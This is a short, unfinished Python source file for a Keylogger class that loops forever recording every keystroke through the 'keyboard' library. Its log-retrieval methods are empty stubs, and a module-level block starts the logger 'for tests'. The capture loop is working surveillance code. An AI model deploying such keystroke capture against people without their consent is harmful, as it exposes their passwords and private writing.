import keyboard
from keys import Keyboard

class Keylogger:

	def __init__(self):
		self._keyboard = Keyboard()


	def __repr__(self):
		return "Instance of Keylogger"


	def runner(self):
		while True:
			self._keyboard.add(keyboard.read_key())


	def get_log(self, day=None):
		# returns log of day in JSON format
		pass


	def get_interval_log(self, start, end):
		# returns log of interval in JSON format
		pass

# For tests
logger = Keylogger()
logger.runner()
